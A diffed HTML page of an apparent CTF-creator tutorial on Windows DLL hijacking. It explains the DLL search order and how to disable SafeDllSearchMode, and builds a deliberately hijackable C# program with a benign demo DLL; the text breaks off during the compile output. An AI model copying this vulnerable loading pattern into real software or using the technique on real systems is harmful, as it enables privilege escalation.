@@ -1,0 +1,758 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Windows Local Privilege Escalation - DLL Hijacking for CTF Creators - pwnlog</title><meta name="Description" content="Windows Local Privilege Escalation - DLL Hijacking"><meta property="og:url" content="//localhost:1313/windows-privesc-dll-hijacking/">
+  <meta property="og:site_name" content="pwnlog">
+  <meta property="og:title" content="Windows Local Privilege Escalation - DLL Hijacking for CTF Creators">
+  <meta property="og:description" content="Windows Local Privilege Escalation - DLL Hijacking">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-03-20T11:33:00+08:00">
+    <meta property="article:modified_time" content="2022-03-20T11:33:00+08:00">
+    <meta property="article:tag" content="Path Dll Hijacking">
+    <meta property="article:tag" content="Dll Hijacking Sideloading">
+    <meta property="article:tag" content="Local Privilege Escalation">
+    <meta property="article:tag" content="Windows">
+    <meta property="og:image" content="//localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/logo.png">
+  <meta name="twitter:title" content="Windows Local Privilege Escalation - DLL Hijacking for CTF Creators">
+  <meta name="twitter:description" content="Windows Local Privilege Escalation - DLL Hijacking">
+<meta name="application-name" content="pwnlog">
+<meta name="apple-mobile-web-app-title" content="pwnlog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="//localhost:1313/windows-privesc-dll-hijacking/" /><link rel="prev" href="//localhost:1313/windows-privesc-path-hijacking/" /><link rel="next" href="//localhost:1313/windows-privesc-credential-hunting/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Windows Local Privilege Escalation - DLL Hijacking for CTF Creators",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/\/localhost:1313\/windows-privesc-dll-hijacking\/"
+        },"image": ["\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "path dll hijacking, dll hijacking sideloading, local privilege escalation, windows","wordcount":  2113 ,
+        "url": "\/\/localhost:1313\/windows-privesc-dll-hijacking\/","datePublished": "2022-03-20T11:33:00+08:00","dateModified": "2022-03-20T11:33:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "\/\/localhost:1313\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "pwnlog"
+            },"description": "Windows Local Privilege Escalation - DLL Hijacking"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> ~/ </a><a class="menu-item" href="/posts/"> ~/posts </a><a class="menu-item" href="/tags/"> ~/tags </a><a class="menu-item" href="/categories/"> ~/categories </a><a class="menu-item" href="/about/"> ~/about </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/" title="">~/</a><a class="menu-item" href="/posts/" title="">~/posts</a><a class="menu-item" href="/tags/" title="">~/tags</a><a class="menu-item" href="/categories/" title="">~/categories</a><a class="menu-item" href="/about/" title="">~/about</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Windows Local Privilege Escalation - DLL Hijacking for CTF Creators</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>pwnlog</a></span>&nbsp;<span class="post-category">included in <a href="/categories/windows-local-privilege-escalation/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Windows Local Privilege Escalation</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-20">2022-03-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2113 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;10 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#dll-hijacking">DLL Hijacking</a></li>
+    <li><a href="#dll-hijacking-vs-reflective-dll-hijacking-vs-dll-sideloading">DLL Hijacking vs Reflective DLL Hijacking vs DLL Sideloading</a></li>
+    <li><a href="#is-path-dll-hijacking-a-vulnerability">Is PATH DLL Hijacking a Vulnerability?</a>
+      <ul>
+        <li><a href="#dll-search-order">DLL Search Order</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation-via-dll-hijacking-sideloading--path-dll-hijacking">Privilege Escalation via DLL Hijacking Sideloading &amp; PATH DLL Hijacking</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#configuration--privilege-escalation">Configuration &amp; Privilege Escalation</a></li>
+          </ul>
+        </li>
+        <li><a href="#defense">Defense</a>
+          <ul>
+            <li><a href="#additional-defenses">Additional Defenses</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="dll-hijacking">DLL Hijacking</h1>
+<p>A dynamically compiled Win32 executable may use functions exported by built-in or third-party Dynamic Link Libraries (DLLs). There are two common ways to achieve this:</p>
+<ul>
+<li>
+<p><strong>Import Address Table (IAT)</strong>: When a program is compiled, an import address table is written into the headers of the Portable Executable (PE). The IAT keeps track of the functions that need to be imported from a DLL. As a result, every time the program runs, the linker knows which libraries to load and which functions to call.</p>
+</li>
+<li>
+<p><strong>Windows APIs</strong>: Libraries can be imported at runtime using functions such as <code>LoadLibrary()</code> or <code>LoadLibraryEx()</code> from the Windows API.</p>
+</li>
+</ul>
+<h1 id="dll-hijacking-vs-reflective-dll-hijacking-vs-dll-sideloading">DLL Hijacking vs Reflective DLL Hijacking vs DLL Sideloading</h1>
+<p>This article does not cover every aspect of DLL hijacking. However, at a high level, these are the main differences:</p>
+<ul>
+<li>
+<p><strong>DLL Hijacking</strong>: Also known as <code>PATH DLL Hijacking</code>, this occurs when a DLL file is written to disk and the <code>%PATH%</code> environment variable is exploited.</p>
+</li>
+<li>
+<p><strong>Reflective DLL Hijacking</strong>: In this method, a DLL file is not written to disk. Instead, the DLL is loaded directly into memory and executed from there.</p>
+</li>
+<li>
+<p><strong>DLL Sideloading</strong>: This happens when the permissions of an application&rsquo;s directory are not properly configured, often limiting the impact to that specific application.</p>
+</li>
+</ul>
+<h1 id="is-path-dll-hijacking-a-vulnerability">Is PATH DLL Hijacking a Vulnerability?</h1>
+<p>According to Microsoft, they won’t address DLL hijacking scenarios involving <code>%PATH%</code> directories as a vulnerability. As we can see in this <a href="https://msrc-blog.microsoft.com/2018/04/04/triaging-a-dll-planting-vulnerability/" target="_blank" rel="noopener noreffer ">article</a>.</p>
+<h2 id="dll-search-order">DLL Search Order</h2>
+<p>Understanding how Windows performs the <a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order" target="_blank" rel="noopener noreffer ">Dynamic-Link Library (DLL) Search Order</a> is crucial. According to the official documentation, the process is as follows:</p>
+<blockquote>
+<p>Desktop applications can control the location from which a DLL is loaded by specifying a full path, using <a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-redirection" target="_blank" rel="noopener noreffer ">DLL redirection</a>, or by using a <a href="https://docs.microsoft.com/en-us/windows/desktop/SbsCs/manifests" target="_blank" rel="noopener noreffer ">manifest</a>. If none of these methods are used, the system searches for the DLL at load time as described in this section.</p>
+<p>Before the system searches for a DLL, it checks the following:</p>
+<ul>
+<li>If a DLL with the same module name is already loaded in memory, the system uses the loaded DLL, regardless of its directory. The system does not search for the DLL.</li>
+<li>If the DLL is on the list of known DLLs for the version of Windows on which the application is running, the system uses its copy of the known DLL (and the known DLL&rsquo;s dependent DLLs, if any). The system does not search for the DLL. For a list of known DLLs on the current system, see the following registry key: <strong>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</strong>.</li>
+</ul>
+</blockquote>
+<p>Based on this information, Windows checks if a DLL is loaded in primary memory <strong>before</strong> searching for it. If it isn&rsquo;t, it checks the &lsquo;<strong>KnownDLLs</strong>&rsquo; list under the registry entry &lsquo;<strong>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</strong>&rsquo;. Primary memory, however, cannot be managed at an integrity level that is not a system-integrity level.</p>
+<div class="details admonition warning open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-exclamation-triangle fa-fw" aria-hidden="true"></i>Warning<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">The system&rsquo;s DLL search order is determined by whether or not Safe DLL Search Mode is enabled. In Safe DLL Search Mode, the user&rsquo;s current directory is placed later in the search order.</div>
+        </div>
+    </div>
+<p>Safe DLL Search Mode is enabled by default. To disable this feature, create the <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</code> registry value and set it to 0.</p>
+<p>According to the official documentation, the search order is as follows:</p>
+<blockquote>
+<p>If <strong>SafeDllSearchMode</strong> is enabled, the search order is:</p>
+<ol>
+<li>The directory from which the application loaded.</li>
+<li>The system directory. Use the <a href="https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya" target="_blank" rel="noopener noreffer "><strong>GetSystemDirectory</strong></a> function to get the path of this directory.</li>
+<li>The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.</li>
+<li>The Windows directory. Use the <a href="https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya" target="_blank" rel="noopener noreffer "><strong>GetWindowsDirectory</strong></a> function to get the path of this directory.</li>
+<li>The current directory.</li>
+<li>The directories listed in the PATH environment variable. Note that this does not include the per-application path specified by the <strong>App Paths</strong> registry key. The <strong>App Paths</strong> key is not used when computing the DLL search path.</li>
+</ol>
+<p>If <strong>SafeDllSearchMode</strong> is disabled, the search order is:</p>
+<ol>
+<li>The directory from which the application loaded.</li>
+<li>The current directory.</li>
+<li>The system directory. Use the <a href="https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya" target="_blank" rel="noopener noreffer "><strong>GetSystemDirectory</strong></a> function to get the path of this directory.</li>
+<li>The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.</li>
+<li>The Windows directory. Use the <a href="https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi-getwindowsdirectorya" target="_blank" rel="noopener noreffer "><strong>GetWindowsDirectory</strong></a> function to get the path of this directory.</li>
+<li>The directories listed in the PATH environment variable. Note that this does not include the per-application path specified by the <strong>App Paths</strong> registry key. The <strong>App Paths</strong> key is not used when computing the DLL search path.</li>
+</ol>
+</blockquote>
+<p>Here is a diagram of how the DLL search order looks when <strong>SafeDllSearchMode</strong> is enabled:</p>
+<figure><a class="lightgallery" href="/images/posts/dll-search-order.png" title="/images/posts/dll-search-order.png" data-thumbnail="/images/posts/dll-search-order.png" data-sub-html="<h2>DLL Search Order with SafeDllSearchMode enabled</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/dll-search-order.png"
+            data-srcset="/images/posts/dll-search-order.png, /images/posts/dll-search-order.png 1.5x, /images/posts/dll-search-order.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/dll-search-order.png" />
+    </a><figcaption class="image-caption">DLL Search Order with SafeDllSearchMode enabled</figcaption>
+    </figure>
+<p>The potential issues are marked: if an attacker can <strong>write</strong> to the application folder, they can perform <code>DLL Sideloading</code>, or if they can <strong>write</strong> to the directories listed in the <code>%PATH%</code> environment variable, they can perform <code>PATH DLL Hijacking</code>.</p>
+<h1 id="privilege-escalation-via-dll-hijacking-sideloading--path-dll-hijacking">Privilege Escalation via DLL Hijacking Sideloading &amp; PATH DLL Hijacking</h1>
+<p>The problem with DLL Hijacking is in the fact that if a DLL can be loaded from another directory (PATH DLL Hijacking) or simply replaced in the applications folder (DLL Sideloading), then we as attackers can create our own DLL payload. If a service or an application is vulnerable to <code>DLL Hijacking</code> we can escalate our privileges as long as the service or application is executed with <code>higher privileges</code> or with a <code>higher integrity level</code>.</p>
+<p>DLL Hijacking is especially effective when it is implemented in services that are running as the LocalSystem (<code>NT AUTHORITY\SYSTEM</code>) service account since it will allow us to escalate our privileges to <code>System-integrity level</code>.</p>
+<h3 id="configuration--privilege-escalation">Configuration &amp; Privilege Escalation</h3>
+<p>We&rsquo;re gonna create an empty <code>Empty Project (.NET Framework)</code> for C#:</p>
+<figure><a class="lightgallery" href="/images/posts/vs-dll-hijack.png" title="/images/posts/vs-dll-hijack.png" data-thumbnail="/images/posts/vs-dll-hijack.png" data-sub-html="<h2>VS 1</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/vs-dll-hijack.png"
+            data-srcset="/images/posts/vs-dll-hijack.png, /images/posts/vs-dll-hijack.png 1.5x, /images/posts/vs-dll-hijack.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/vs-dll-hijack.png" />
+    </a><figcaption class="image-caption">VS 1</figcaption>
+    </figure>
+<p>Then we&rsquo;re gonna set the directory in which we will save our project:</p>
+<figure><a class="lightgallery" href="/images/posts/vs-dll-hijack-2.png" title="/images/posts/vs-dll-hijack-2.png" data-thumbnail="/images/posts/vs-dll-hijack-2.png" data-sub-html="<h2>VS 2</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/vs-dll-hijack-2.png"
+            data-srcset="/images/posts/vs-dll-hijack-2.png, /images/posts/vs-dll-hijack-2.png 1.5x, /images/posts/vs-dll-hijack-2.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/vs-dll-hijack-2.png" />
+    </a><figcaption class="image-caption">VS 2</figcaption>
+    </figure>
+<p>Now we&rsquo;ll need to add a new item (Code File):</p>
+<figure><a class="lightgallery" href="/images/posts/vs-dll-hijack-3.png" title="/images/posts/vs-dll-hijack-3.png" data-thumbnail="/images/posts/vs-dll-hijack-3.png" data-sub-html="<h2>VS 3</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/vs-dll-hijack-3.png"
+            data-srcset="/images/posts/vs-dll-hijack-3.png, /images/posts/vs-dll-hijack-3.png 1.5x, /images/posts/vs-dll-hijack-3.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/vs-dll-hijack-3.png" />
+    </a><figcaption class="image-caption">VS 3</figcaption>
+    </figure>
+<p>We&rsquo;ll name this item as <code>DLL-Hijack.cs</code> which it&rsquo;ll be a Code File:</p>
+<figure><a class="lightgallery" href="/images/posts/vs-dll-hijack-4.png" title="/images/posts/vs-dll-hijack-4.png" data-thumbnail="/images/posts/vs-dll-hijack-4.png" data-sub-html="<h2>VS 4</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/vs-dll-hijack-4.png"
+            data-srcset="/images/posts/vs-dll-hijack-4.png, /images/posts/vs-dll-hijack-4.png 1.5x, /images/posts/vs-dll-hijack-4.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/vs-dll-hijack-4.png" />
+    </a><figcaption class="image-caption">VS 4</figcaption>
+    </figure>
+<p>In the <code>DLL-Hijack.cs</code> we&rsquo;ll write this DLL hijackable vulnerable code:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.InteropServices</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">dll_hijack</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="na">    [DllImport(&#34;unknown.dll&#34;)]</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">extern</span> <span class="k">void</span> <span class="n">UnknownMethod</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="n">UnknownMethod</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Next, we&rsquo;ll add a C++ item (Code File) named <code>unknown.cpp</code>:</p>
+<figure><a class="lightgallery" href="/images/posts/vs-dll-hijack-5.png" title="/images/posts/vs-dll-hijack-5.png" data-thumbnail="/images/posts/vs-dll-hijack-5.png" data-sub-html="<h2>Lighthouse</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/vs-dll-hijack-5.png"
+            data-srcset="/images/posts/vs-dll-hijack-5.png, /images/posts/vs-dll-hijack-5.png 1.5x, /images/posts/vs-dll-hijack-5.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/vs-dll-hijack-5.png" />
+    </a><figcaption class="image-caption">Lighthouse</figcaption>
+    </figure>
+<p>We&rsquo;ll create a function named <code>UnknownMethod</code> with the following code:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">extern</span> <span class="s">&#34;C&#34;</span> <span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="n">UnknownMethod</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;Hola Mundo!&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then we&rsquo;ll create an <code>unknown.def</code> file which defines which function to export:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-def" data-lang="def"><span class="line"><span class="cl"><span class="n">LIBRARY</span> <span class="s">&#34;Unknown&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">EXPORTS</span>
+</span></span><span class="line"><span class="cl">  <span class="n">UnknownMethod</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The <strong>Solution Explorer</strong> looks like this:</p>
+<figure><a class="lightgallery" href="/images/posts/vs-dll-hijack-6.png" title="/images/posts/vs-dll-hijack-6.png" data-thumbnail="/images/posts/vs-dll-hijack-6.png" data-sub-html="<h2>Solution Explorer</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/vs-dll-hijack-6.png"
+            data-srcset="/images/posts/vs-dll-hijack-6.png, /images/posts/vs-dll-hijack-6.png 1.5x, /images/posts/vs-dll-hijack-6.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/vs-dll-hijack-6.png" />
+    </a><figcaption class="image-caption">Solution Explorer</figcaption>
+    </figure>
+<p>Build the solution:</p>
+<figure><a class="lightgallery" href="/images/posts/vs-dll-hijack-6.1.png" title="/images/posts/vs-dll-hijack-6.1.png" data-thumbnail="/images/posts/vs-dll-hijack-6.1.png" data-sub-html="<h2>Solution Explorer</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/vs-dll-hijack-6.1.png"
+            data-srcset="/images/posts/vs-dll-hijack-6.1.png, /images/posts/vs-dll-hijack-6.1.png 1.5x, /images/posts/vs-dll-hijack-6.1.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/vs-dll-hijack-6.1.png" />
+    </a><figcaption class="image-caption">Solution Explorer</figcaption>
+    </figure>
+<p>Add the details:</p>
+<figure><a class="lightgallery" href="/images/posts/vs-dll-hijack-7.png" title="/images/posts/vs-dll-hijack-7.png" data-thumbnail="/images/posts/vs-dll-hijack-7.png" data-sub-html="<h2>Solution Explorer</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/vs-dll-hijack-7.png"
+            data-srcset="/images/posts/vs-dll-hijack-7.png, /images/posts/vs-dll-hijack-7.png 1.5x, /images/posts/vs-dll-hijack-7.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/vs-dll-hijack-7.png" />
+    </a><figcaption class="image-caption">Solution Explorer</figcaption>
+    </figure>
+<p>We&rsquo;re going to create the DLL with the <strong>Developer Command Prompt for VS 2022</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Microsoft</span> <span class="n">Visual</span> <span class="n">Studio</span><span class="p">\</span><span class="mf">2022</span><span class="p">\</span><span class="n">Community</span><span class="p">&gt;</span><span class="nb">cd </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">DLL-Hijack</span><span class="p">\</span><span class="nb">DLL-Hijack</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">DLL-Hijack</span><span class="p">\</span><span class="nb">DLL-Hijack</span><span class="p">&gt;</span><span class="n">cl</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">W0</span> <span class="p">/</span><span class="n">DUNICODE</span> <span class="p">/</span><span class="n">D_UNICODE</span> <span class="p">/</span><span class="n">D_USRDLL</span> <span class="p">/</span><span class="n">D_WINDLL</span> <span class="n">unknown</span><span class="p">.</span><span class="nb">cpp </span><span class="n">unknown</span><span class="p">.</span><span class="py">def</span> <span class="p">/</span><span class="n">MT</span> <span class="p">/</span><span class="n">link</span> <span class="p">/</span><span class="n">DLL</span> <span class="p">/</span><span class="n">OUT</span><span class="err">:</span><span class="n">unknown</span><span class="p">.</span><span class="py">dll</span>
+</span></span><span class="line"><span class="cl"><span class="n">Microsoft</span> <span class="p">(</span><span class="n">R</span><span class="p">)</span> <span class="n">C</span><span class="p">/</span><span class="n">C</span><span class="p">++</span> <span class="n">Optimizing</span> <span class="n">Compiler</span> <span class="n">Version</span> <span class="mf">19.31</span><span class="p">.</span><span class="py">31104</span> <span class="k">for</span> <span class="n">x86</span>
+</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="p">.</span>  <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">unknown</span><span class="p">.</span><span class="nb">cpp
